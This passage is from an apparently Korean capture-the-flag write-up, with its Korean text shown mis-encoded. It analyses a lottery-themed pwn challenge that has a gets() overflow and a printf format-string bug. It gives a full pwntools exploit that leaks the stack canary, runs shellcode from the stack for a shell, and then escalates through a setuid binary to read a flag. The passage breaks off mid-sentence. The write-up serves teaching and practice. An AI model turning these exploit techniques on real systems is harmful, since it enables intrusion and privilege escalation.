class="line">  <span class="type">int</span> choice; <span class="comment">// [rsp+Ch] [rbp-4h] BYREF</span></span><br><span class="line"></span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;\nEnter your choice: &quot;</span>);</span><br><span class="line">  __isoc99_scanf(<span class="string">&quot;%d&quot;</span>, &amp;choice);</span><br><span class="line">  getchar();</span><br><span class="line">  <span class="built_in">putchar</span>(<span class="number">10</span>);</span><br><span class="line">  <span class="keyword">if</span> ( choice == <span class="number">1</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    roll_the_dice();</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span> <span class="keyword">if</span> ( choice == <span class="number">2</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">if</span> ( coupon )                               <span class="comment">// checking the global variable for ROP</span></span><br><span class="line">    &#123;</span><br><span class="line">      <span class="built_in">puts</span>(<span class="string">&quot;Sorry, but you only get one chance to enter the coupon code!&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">      coupon = <span class="number">1</span>;</span><br><span class="line">      enter_coupon();                           <span class="comment">// only 1 time</span></span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;It&#x27;s too sad to see you go :(&quot;</span>);</span><br><span class="line">    quit = <span class="number">1</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">if</span> ( quit )</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">  <span class="keyword">return</span> choose_option();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>ì´ í•¨ìˆ˜ì—ì„œ ë©”ë‰´ë¥¼ ê³ ë¥¼ ìˆ˜ ìžˆë‹¤.</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">Welcome To The Festive Lottery!</span><br><span class="line"></span><br><span class="line">1. Roll the dice!</span><br><span class="line">2. Enter a coupon code</span><br><span class="line">3. Exit</span><br><span class="line">Enter your choice: </span><br></pre></td></tr></table></figure><p>1ë²ˆ ë©”ë‰´ëŠ” <code>roll_the_dice()</code> í•¨ìˆ˜ë¥¼ ì‹¤í–‰ì‹œì¼œì¤€ë‹¤.<br>2ë²ˆ ë©”ë‰´ì—ì„œ ì—¬ëŸ¬ê°€ì§€ ê²€ì‚¬ë¥¼ í•œë‹¤. coupon ì „ì—­ ë³€ìˆ˜ë¥¼ ê²€ì‚¬í•˜ëŠ”ë°, playerê°€ í•œ ë²ˆë§Œ <code>enter_coupon()</code> í•¨ìˆ˜ë§Œ ì‹¤í–‰ì‹œí‚¬ ìˆ˜ ìžˆë‹¤ëŠ” ê²ƒì„ ì˜ë¯¸í•œë‹¤.</p><h4 id="1-Roll-the-dice"><a href="#1-Roll-the-dice" class="headerlink" title="1. Roll the dice!"></a>1. Roll the dice!</h4><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> <span class="title function_">roll_the_dice</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">int</span> result; <span class="comment">// eax</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">switch</span> ( rand() % <span class="number">6</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">case</span> <span class="number">0</span>:</span><br><span class="line">      result = <span class="built_in">puts</span>(<span class="string">&quot;Hurray! You got a 1&quot;</span>);</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">case</span> <span class="number">1</span>:</span><br><span class="line">    <span class="keyword">case</span> <span class="number">2</span>:</span><br><span class="line">    <span class="keyword">case</span> <span class="number">3</span>:</span><br><span class="line">      <span class="built_in">puts</span>(<span class="string">&quot;Congrats! You won a flag!&quot;</span>);</span><br><span class="line">      result = win();</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">case</span> <span class="number">4</span>:</span><br><span class="line">      result = <span class="built_in">puts</span>(<span class="string">&quot;Ah! You just missed it&quot;</span>);</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">case</span> <span class="number">5</span>:</span><br><span class="line">      <span class="keyword">if</span> ( got_6 )</span><br><span class="line">      &#123;</span><br><span class="line">        result = <span class="built_in">puts</span>(<span class="string">&quot;Sorry, you can avail this offer only once!&quot;</span>);</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="keyword">else</span></span><br><span class="line">      &#123;</span><br><span class="line">        got_6 = <span class="number">1</span>;</span><br><span class="line">        another_chance = <span class="number">1</span>;</span><br><span class="line">        result = <span class="built_in">puts</span>(<span class="string">&quot;You get another chance to enter the coupon!&quot;</span>);</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">default</span>:</span><br><span class="line">      result = <span class="built_in">puts</span>(<span class="string">&quot;Did you tamper with the dice? This number should not be there!&quot;</span>);</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>case 3ì¼ë•Œ ì¶œë ¥í•´ì£¼ëŠ” ì € flagëŠ” ê°€ì§œ í”Œëž˜ê·¸ì´ë‹¤.</p><p>case 5ì˜ another_chanceì— ì£¼ëª©í•´ë³´ìž. ë¯¸ë¦¬ ì´ì•¼ê¸°í•˜ìžë©´ ì´ ì „ì—­ ë³€ìˆ˜ëŠ” 2ë²ˆ ë©”ë‰´ì¸ <code>enter_coupon()</code> í•¨ìˆ˜ì—ì„œ ì‚¬ìš©ëœë‹¤.</p><p>got_6 ì „ì—­ ë³€ìˆ˜ëŠ” ì´ëŸ° another_chanceë¥¼ ë‹¨ í•œë²ˆë§Œ 1ë¡œ ì„¸íŒ…í•  ìˆ˜ ìžˆë‹¤ëŠ” ê²ƒì„ ì˜ë¯¸í•˜ëŠ” ê²ƒ ê°™ë‹¤.</p><h4 id="2-Enter-a-coupon-code"><a href="#2-Enter-a-coupon-code" class="headerlink" title="2. Enter a coupon code"></a>2. Enter a coupon code</h4><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">unsigned</span> __int64 <span class="title function_">enter_coupon</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">char</span> input[<span class="number">96</span>]; <span class="comment">// [rsp+10h] [rbp-D0h] BYREF</span></span><br><span class="line">  <span class="type">char</span> coupon_code[<span class="number">14</span>]; <span class="comment">// [rsp+70h] [rbp-70h] BYREF</span></span><br><span class="line">  __int16 v3; <span class="comment">// [rsp+7Eh] [rbp-62h]</span></span><br><span class="line">  <span class="type">char</span> v4[<span class="number">80</span>]; <span class="comment">// [rsp+80h] [rbp-60h] BYREF</span></span><br><span class="line">  <span class="type">int</span> v5; <span class="comment">// [rsp+D0h] [rbp-10h]</span></span><br><span class="line">  <span class="type">unsigned</span> __int64 v6; <span class="comment">// [rsp+D8h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  v6 = __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">  <span class="built_in">strcpy</span>(coupon_code, <span class="string">&quot;YCHHZZHHMSHWI&quot;</span>);</span><br><span class="line">  v3 = <span class="number">0</span>;</span><br><span class="line">  <span class="built_in">memset</span>(v4, <span class="number">0</span>, <span class="keyword">sizeof</span>(v4));</span><br><span class="line">  v5 = <span class="number">0</span>;</span><br><span class="line">  <span class="keyword">while</span> ( <span class="number">1</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;Enter the coupon code: &quot;</span>);</span><br><span class="line">    gets(input);                                <span class="comment">// bof</span></span><br><span class="line">    <span class="keyword">if</span> ( !<span class="built_in">strcmp</span>(input, coupon_code) )          <span class="comment">// same as cooupon code</span></span><br><span class="line">    &#123;</span><br><span class="line">      successfull = <span class="number">1</span>;</span><br><span class="line">      <span class="built_in">puts</span>(<span class="string">&quot;Coupon applied successfully!&quot;</span>);</span><br><span class="line">      <span class="keyword">goto</span> LABEL_7;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;Invalid coupon code! You entered: &quot;</span>);</span><br><span class="line">    <span class="built_in">printf</span>(input);                              <span class="comment">// fsb</span></span><br><span class="line">    <span class="built_in">putchar</span>(<span class="number">10</span>);</span><br><span class="line">    <span class="keyword">if</span> ( !another_chance )                      <span class="comment">// if another_chance = 1 ?</span></span><br><span class="line">      <span class="keyword">break</span>;                                    <span class="comment">// pass</span></span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;You get one more chance to enter the coupon!&quot;</span>);</span><br><span class="line">    another_chance = <span class="number">0</span>;                         <span class="comment">// if another_chance == 1, </span></span><br><span class="line">                                                <span class="comment">// It can make another_chance = 0.</span></span><br><span class="line">  &#125;</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;No more chances left!&quot;</span>);</span><br><span class="line">LABEL_7:</span><br><span class="line">  <span class="keyword">if</span> ( successfull != <span class="number">1</span> )                       <span class="comment">// if (input != coupon_code), I can&#x27;t do ROP.</span></span><br><span class="line">                                                <span class="comment">// =&gt; should (input == coupon_code)</span></span><br><span class="line">    choose_option();</span><br><span class="line">  <span class="keyword">return</span> __readfsqword(<span class="number">0x28</span>u) ^ v6;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>í•´ë‹¹ í•¨ìˆ˜ë¥¼ ì—´ì–´ë³´ë©´ bofì™€ fsb ì·¨ì•½ì ì´ í•˜ë‚˜ì”© ëˆˆì— ë³´ì¸ë‹¤. </p><p>1ë²ˆ ë©”ë‰´ <code>roll_the_dice()</code> í•¨ìˆ˜ì—ì„œ ë´¤ë˜ another_chance ì „ì—­ ë³€ìˆ˜ì— ì£¼ëª©í•´ë³´ìž. </p><p>bofê°€ ë¨¼ì € í„°ì§€ê³  fsbê°€ ê·¸ ë‹¤ìŒ í„°ì§„ë‹¤. ê·¸ë¦¬ê³  another_chance ì „ì—­ ë³€ìˆ˜ë¥¼ ì‚¬ìš©í•œë‹¤. ì–˜ê°€ 1ì´ë©´ breakê°€ ë˜ì§€ ì•Šê³  whileì„ í•œ ë²ˆ ë” ëŒ ìˆ˜ ìžˆê²Œ ëœë‹¤. ê·¸ë¦¬ê³  í•´ë‹¹ ì „ì—­ ë³€ìˆ˜ë¥¼ 0ìœ¼ë¡œ setí•œë‹¤. </p><p>ì´ ë§ì€ ë­ë‹¤? ë£¨í”„ë¥¼ ë‘ ë²ˆ ëŒ ìˆ˜ ìžˆë‹¤. ì¦‰, bofì™€ fsbë¥¼ í•œ ë²ˆ ë” í™œìš©í•  ìˆ˜ ìžˆë‹¤ëŠ” ëœ».</p><p>ê·¸ë¦¬ê³  í”„ë¡œê·¸ëž¨ íë¦„ì„ ë°”ê¾¸ê¸° ìœ„í•´ì„œ retë¥¼ ë°”ê¿”ì¤˜ì•¼í•˜ëŠ”ë°, ì´ë¥¼ ìœ„í•´ì„  í•¨ìˆ˜ returnì„ í•´ì•¼í•œë‹¤. ì½”ë“œë¥¼ ë³´ë©´ coupon_codeë¥¼ í‹€ë¦¬ë©´ successfull ì „ì—­ ë³€ìˆ˜ê°€ 0ìœ¼ë¡œ ìœ ì§€ë˜ì–´ í•¨ìˆ˜ê°€ ì¢…ë£Œë˜ê¸° ì „ì— <code>choose_option()</code> í•¨ìˆ˜ë¥¼ ì‹¤í–‰í•˜ê²Œ ëœë‹¤. ê·¸ëŸ¬ë©´ ì•ˆë˜ê¸° ë•Œë¬¸ì— coupon_codeë¥¼ ë§žì¶°ì£¼ì–´ì„œ successfullì„ 1ë¡œ setí•´ì¤˜ì•¼í•œë‹¤.</p><p>ë§ˆì¹¨ ìŠ¤íƒì— ìš°ë¦¬ì˜ input ë‹¤ìŒì— coupon_codeê°€ ìœ„ì¹˜í•˜ê³  ìžˆê¸° ë•Œë¬¸ì— êµ³ì´ inputì— â€œYCHHZZHHMSHWIâ€ì„ ì ì§€ ì•Šì•„ë„ ìš°íšŒí•  ìˆ˜ ìžˆë‹¤.</p><h3 id="Vulnerability"><a href="#Vulnerability" class="headerlink" title="Vulnerability"></a>Vulnerability</h3><p>ì·¨ì•½ì ì€ ìœ„ì—ì„œ ë´¤ë“¯ <code>enter_coupon()</code> í•¨ìˆ˜ì—ì„œ bofì™€ fsbê°€ ë°œìƒí•œë‹¤. canaryì™€ pieê°€ ê±¸ë ¤ìžˆê¸° ë•Œë¬¸ì— fsbë¡œ ì´ê²ƒì„ ë¦­í•´ì•¼í•˜ëŠ” í•„ìš”ì„±ì„ ëŠë‚€ë‹¤. </p><h2 id="Exploit"><a href="#Exploit" class="headerlink" title="Exploit"></a>Exploit</h2><p>ìš°ë¦¬ëŠ” bofì™€ fsbê°€ ìˆœì°¨ì ìœ¼ë¡œ ë‘ ë²ˆì”© í„°ì§„ë‹¤. ìƒê°í•´ë³´ë©´, pieë¥¼ êµ³ì´ ë¦­í•  í•„ìš”ê°€ ì—†ë‹¤. ì™œëƒí•˜ë©´ NX bit disabledì´ê¸° ë•Œë¬¸ì— ìš°ë¦¬ëŠ” ìŠ¤íƒì—ì„œ ì‰˜ì½”ë“œë¥¼ ì‹¤í–‰ì‹œí‚¬ ìˆ˜ ìžˆë‹¤.</p><p>stack ì£¼ì†Œë¥¼ ë¦­í•´ì„œ ìš°ë¦¬ì˜ input bufì™€ ì–¼ë§ˆë‚˜ ë–¨ì–´ì ¸ìžˆëŠ”ì§€ offsetì„ êµ¬í•  ìˆ˜ ìžˆê¸° ë•Œë¬¸ì— return ì£¼ì†Œë¥¼ ê±°ê¸°ë¡œ ëŒë ¤ì¤„ ìˆ˜ ìžˆë‹¤.</p><p>ì´ë•Œ ìµìŠ¤ í™•ë¥ ì„ ë†’ì´ê¸° ìœ„í•´ NOP Sledë¥¼ í•´ì¤¬ë‹¤. ì´ ë•Œ íŽ˜ì´ë¡œë“œ êµ¬ì„±ì€ ì•„ëž˜ì™€ ê°™ë‹¤.</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">`\x00`  * (0xd0-0x62) + NOP sled + shellcode + canary + sfp + ret(input buf)</span><br></pre></td></tr></table></figure><p>input í¬ê¸°ì™€ coupon_code í¬ê¸°ë¥¼ í•©ì¹œ ë§Œí¼ <code>\x00</code>ì„ ë„£ì–´ì£¼ì—ˆë‹¤. í•˜ë“œì½”ë”©ëœ coupon_codeì„ ë§žì¶°ì„œ ì ì§€ ì•Šì•„ì¤˜ë„ strcmpë¥¼ ì†ì‰½ê²Œ ìš°íšŒí•  ìˆ˜ ìžˆë‹¤.</p><p>ê·¸ëŸ¼ ì‰˜ì½”ë“œ ì‹¤í–‰ì´ ì„±ê³µí•˜ê²Œ ë˜ê³  ì‰˜ì„ íšë“í•  ìˆ˜ ìžˆë‹¤. ì½”ë“œ ì„¤ëª…í•  ë–„ ì–¸ê¸‰í–ˆë“¯ì´ í”Œëž˜ê·¸ì˜ ìœ„ì¹˜ëŠ” ì • ë‹¤ë¥¸ ê³³ì— ìœ„ì¹˜í•˜ê³  ìžˆë‹¤. <code>ls -al *</code>ì„ ì´ìš©í•´ì„œ ì§„ì§œ í”Œëž˜ê·¸ì²˜ëŸ¼ ë³´ì´ëŠ” ê²ƒì„ ì°¾ì•„ë³´ì•˜ë‹¤.</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">opt:</span><br><span class="line">total 28</span><br><span class="line">drwxr-x--- 1 0 1000  4096 Oct 22 03:03 .</span><br><span class="line">drwxr-x--- 1 0 1000  4096 Oct 22 04:05 ..</span><br><span class="line">-rwxr----- 1 0 1001    36 Oct 21 05:21 real_flag.txt</span><br><span class="line">-rwsr-sr-x 1 0 1001 13440 Oct 22 03:03 worker</span><br></pre></td></tr></table></figure><p>ì§„ì§œ í”Œëž˜ê·¸ëŠ” <code>/opt/real_flag.txt</code>ì— ìœ„ì¹˜í•˜ê³  ìžˆë‹¤. ë¬¸ì œëŠ” ê¶Œí•œì´ ì—†ì–´ì„œ í”Œëž˜ê·¸ë¥¼ ì½ì„ ìˆ˜ê°€ ì—†ë‹¤.</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$ cat /opt/real_flag.txt</span><br><span class="line">cat: /opt/real_flag.txt: Permission denied</span><br></pre></td></tr></table></figure><p>ê·¸ëž˜ì„œ ì•„ëž˜ setuidê°€ ê±¸ë¦° worker íŒŒì¼ì„ ì´ìš©í•´ì„œ íŒŒì¼ì„ ì‹¤í–‰ì‹œí‚´ìœ¼ë¡œì¨ ê¶Œí•œìƒìŠ¹ì„ í•´ì¤€ ë’¤ì— ê·¸ ê¶Œí•œìœ¼ë¡œ read_flag.txtë¥¼ ì½ì–´ì¤˜ì•¼ í•œë‹¤.</p><p>í•œ ë§ˆë””ë¡œ worker ë°”ì´ë„ˆë¦¬ë¥¼ ìµìŠ¤í•´ì•¼ í•œë‹¤. ì´ê²ƒì„ ìœ„í•´ì„œ ë¦¬ëª¨íŠ¸ì˜ worker ë°”ì´ë„ˆë¦¬ë¥¼ ë¡œì»¬ë¡œ ë³µì‚¬í•˜ëŠ” ìž‘ì—…ì´ í•„ìš”í•œë°, ë‚˜ëŠ” base64ë¥¼ ì´ìš©í•´ì„œ ë°”ì´ë„ˆë¦¬ë¥¼ ë³µì‚¬í•´ì£¼ì—ˆë‹¤.</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">base64 -w0 /opt/worker </span><br></pre></td></tr></table></figure><p>ë¡œì»¬ì—ì„œ íŒŒì¼ í•˜ë‚˜ ë§Œë“¤ì–´ì„œ base64í•œ ê²ƒì„ ë¶™ì¸ ë‹¤ìŒ ë””ì½”ë”©ì„ í•˜ë©´ ëœë‹¤.</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">vi aa</span><br><span class="line">base64 -d aa &gt; worker</span><br><span class="line">chmod +x worker</span><br></pre></td></tr></table></figure><p>ì´ worker ë°”ì´ë„ˆë¦¬ë¥¼ ìµìŠ¤í•˜ê²Œ ë˜ë©´ worker ê¶Œí•œìœ¼ë¡œ ê¶Œí•œ ìƒìŠ¹ì´ ë˜ì—ˆê¸° ë•Œë¬¸ì— ìµœì¢…ì ìœ¼ë¡œ real_flag.txtë¥¼ ì½ì„ ìˆ˜ ìžˆë‹¤. worker ë°”ì´ë„ˆë¦¬ ìµìŠ¤ëŠ” ê°„ë‹¨í•˜ê¸° ë•Œë¬¸ì— ë”°ë¡œ ì–¸ê¸‰í•˜ì§€ ì•Šê² ë‹¤.</p><h3 id="Exploit-Scenario"><a href="#Exploit-Scenario" class="headerlink" title="Exploit Scenario"></a>Exploit Scenario</h3><h4 id="Part-1"><a href="#Part-1" class="headerlink" title="Part 1"></a>Part 1</h4><ol><li>case 5 ì‹¤í–‰í•  ë•Œê¹Œì§€ 1ë²ˆ ë©”ë‰´ ì‹¤í–‰</li><li>2ë²ˆ ë©”ë‰´ì—ì„œ canary ë° stack ì£¼ì†Œ ë¦­í•œ í›„, input buf ì£¼ì†Œ ê³„ì‚° (ì²« ë²ˆì§¸ ë£¨í”„)</li><li>payload êµ¬ì„± (ë‘ ë²ˆì§¸ ë£¨í”„)<ul><li><code>\x00</code>â€¦ + NOP sled + shellcode + canary + sfp + ret(input buf) # <code>\x00</code>ìœ¼ë¡œ strcmp ê²€ì‚¬ í†µê³¼</li></ul></li></ol><h4 id="Part-2"><a href="#Part-2" class="headerlink" title="Part 2"></a>Part 2</h4><ol start="4"><li>ë¦¬ëª¨íŠ¸ ì‰˜ì„ ë”´ í›„ &#x2F;opt&#x2F;worker ìµìŠ¤ ì§„í–‰</li><li>ê¶Œí•œ ìƒìŠ¹ í›„ real_flag.txt ì½ê¸°</li></ol><h3 id="Exploit-Code"><a href="#Exploit-Code" class="headerlink" title="Exploit Code"></a>Exploit Code</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">context.arch = <span class="string">&#x27;amd64&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#p = process(&#x27;./chall&#x27;)</span></span><br><span class="line">p = remote(<span class="string">&#x27;34.76.206.46&#x27;</span>, <span class="number">10006</span>)</span><br><span class="line">e = ELF(<span class="string">&#x27;./chall&#x27;</span>)</span><br><span class="line">libc = e.libc</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">enter</span>(<span class="params">inp</span>):</span><br><span class="line">    p.sendlineafter(<span class="string">&#x27;choice:&#x27;</span>, <span class="string">b&#x27;2&#x27;</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">&#x27;code:&#x27;</span>, inp)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">roll</span>():</span><br><span class="line">    <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">        p.sendlineafter(<span class="string">&#x27;choice:&#x27;</span>, <span class="string">b&#x27;1&#x27;</span>)</span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            p.recvline()</span><br><span class="line">            want = p.recvline()</span><br><span class="line">            <span class="keyword">if</span> <span class="string">b&#x27;You get another&#x27;</span> <span class="keyword">in</span> want:</span><br><span class="line">                <span class="built_in">print</span>(want)</span><br><span class="line">                <span class="keyword">return</span></span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                <span class="keyword">continue</span></span><br><span class="line">        <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">            <span class="built_in">print</span>(e)</span><br><span class="line"></span><br><span class="line">roll()</span><br><span class="line"></span><br><span class="line"><span class="comment">## canary 33</span></span><br><span class="line"></span><br><span class="line">enter(<span class="string">&#x27;%33$p %34$p&#x27;</span>)</span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">&#x27;d: &#x27;</span>)</span><br><span class="line">leak = p.recvline().decode()</span><br><span class="line">canary = <span class="built_in">int</span>(leak.split(<span class="string">&#x27; &#x27;</span>)[<span class="number">0</span>], <span class="number">16</span>)</span><br><span class="line">stack_leak = <span class="built_in">int</span>(leak.split(<span class="string">&#x27; &#x27;</span>)[<span class="number">1</span>], <span class="number">16</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">#canary = int(p.recvline()[2:], 16)</span></span><br><span class="line">info(<span class="string">&#x27;canary :: &#x27;</span> + <span class="built_in">hex</span>(canary))</span><br><span class="line"></span><br><span class="line">info(<span class="string">&#x27;stack leak :: &#x27;</span> + <span class="built_in">hex</span>(stack_leak))</span><br><span class="line">buf = stack_leak - <span class="number">0x80</span></span><br><span class="line">info(<span class="string">&#x27;buf :: &#x27;</span> + <span class="built_in">hex</span>(buf))</span><br><span class="line"></span><br><span class="line">sh = asm(<span class="string">&#x27;sub rsp, 0x1000\n&#x27;</span>+shellcraft.sh())</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">hex</span>(<span class="built_in">len</span>(sh)))</span><br><span class="line"></span><br><span class="line">payload = <span class="string">b&#x27;\x00&#x27;</span> * (<span class="number">0xd0</span>-<span class="number">0x62</span>)</span><br><span class="line">payload = payload.ljust(<span class="number">0xd0</span>-<span class="number">0x8</span>-<span class="built_in">len</span>(sh), <span class="string">b&#x27;\x90&#x27;</span>)</span><br><span class="line"></span><br><span class="line">payload += sh</span><br><span class="line">payload += p64(canary)</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">hex</span>(<span class="built_in">len</span>(payload)))</span><br><span class="line"></span><br><span class="line">payload += p64(<span class="number">0</span>)</span><br><span class="line">payload += p64(buf)</span><br><span class="line"></span><br><span class="line">pause()</span><br><span class="line">p.sendlineafter(<span class="string">&#x27;code:&#x27;</span>, payload)</span><br><span class="line"></span><br><span class="line"><span class="comment"># PART 2 ##################################################</span></span><br><span class="line">p.sendline(<span class="string">&#x27;./opt/worker&#x27;</span>)</span><br><span class="line"></span><br><span class="line">win = <span class="number">0x40090c</span></span><br><span class="line"></span><br><span class="line">payload = <span class="string">b&#x27;&#x27;</span></span><br><span class="line">payload += <span class="string">b&#x27;\x00&#x27;</span> * (<span class="number">0x50</span>+<span class="number">0x8</span>) </span><br><span class="line">payload += p64(win)</span><br><span class="line"></span><br><span class="line">p.sendlineafter(<span class="string">&#x27;number:\n&#x27;</span>, <span class="string">b&#x27;1&#x27;</span>)</span><br><span class="line">p.sendlineafter(<span class="string">&#x27;name:\n&#x27;</span>, payload)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><h4 id="shellcodeë¥¼-ì•„ëž˜ì²˜ëŸ¼-êµ¬ì„±í•´ì¤€-ì´ìœ "><a href="#shellcodeë¥¼-ì•„ëž˜ì²˜ëŸ¼-êµ¬ì„±í•´ì¤€-ì´ìœ " class="headerlink" title="shellcodeë¥¼ ì•„ëž˜ì²˜ëŸ¼ êµ¬ì„±í•´ì¤€ ì´ìœ "></a>shellcodeë¥¼ ì•„ëž˜ì²˜ëŸ¼ êµ¬ì„±í•´ì¤€ ì´ìœ </h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sh = asm(<span class="string">&#x27;sub rsp, 0x1000\n&#x27;</span>+shellcraft.sh())</span><br></pre></td></tr></table></figure><p><code>shellcraft.sh()</code>ë§Œí•˜ë©´ ì•ˆë˜ë‚˜? ì™œ <code>sub rsp, 0x1000</code>ì„ ì¶”ê°€í–ˆì„ê¹Œ? </p><p>ì—†ëŠ” ê²½ìš° ìŠ¤íƒì„ 